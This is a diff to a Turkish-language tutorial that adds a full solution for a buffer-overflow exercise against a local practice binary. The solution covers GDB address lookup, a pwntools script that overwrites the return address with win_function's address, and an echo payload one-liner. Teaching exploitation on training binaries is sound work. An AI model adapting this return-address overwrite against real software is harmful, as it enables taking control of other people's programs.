@@ -212,4 +212,59 @@ if __name__ == "__main__":
 
 ```
 
-Exploit'i çalıştırdığınızda, programın çıktısında `hedef_fonksiyon` içinde tanımlanmış olan başarı mesajını görmelisiniz. Bu, programın akışını başarıyla ele geçirdiğiniz anlamına gelir.
+## Tam Çözüm (GDB ile Adres Bulma)
+
+### 1. GDB ile Adres Bulma
+
+```bash
+# Binary'yi GDB ile aç
+gdb ./compiled/vulnerable_code
+
+# Fonksiyon adreslerini bul
+(gdb) info functions
+(gdb) info functions win_function
+(gdb) x/gx win_function
+
+# Buffer overflow'u test et
+(gdb) break vulnerable_function
+(gdb) run
+(gdb) x/32gx $rsp
+(gdb) continue
+```
+
+### 2. Buffer Overflow Exploit Oluşturma
+
+```python
+from pwn import *
+
+# Buffer boyutu ve offset hesaplama
+BUFFER_SIZE = 64
+RETURN_ADDR_OFFSET = 72  # RBP + 8 bytes
+
+# win_function adresini GDB'den al
+win_addr = 0x401146  # Örnek adres
+
+# Payload oluştur
+payload = b"A" * RETURN_ADDR_OFFSET  # Buffer overflow
+payload += p64(win_addr)  # Return address overwrite
+
+# Exploit'i çalıştır
+p = process("./compiled/vulnerable_code")
+p.sendline(payload)
+p.interactive()
+```
+
+### 3. Manuel Test
+
+```bash
+# Hex payload ile test
+echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x46\x11\x40\x00\x00\x00\x00\x00" | ./compiled/vulnerable_code
+```
+
+### 4. Beklenen Sonuç
+
+```
+--- Zafiyet Basariyla Somuruldu! ---
+```
+
+Exploit'i çalıştırdığınızda, programın çıktısında `win_function` içinde tanımlanmış olan başarı mesajını görmelisiniz. Bu, programın akışını başarıyla ele geçirdiğiniz anlamına gelir.
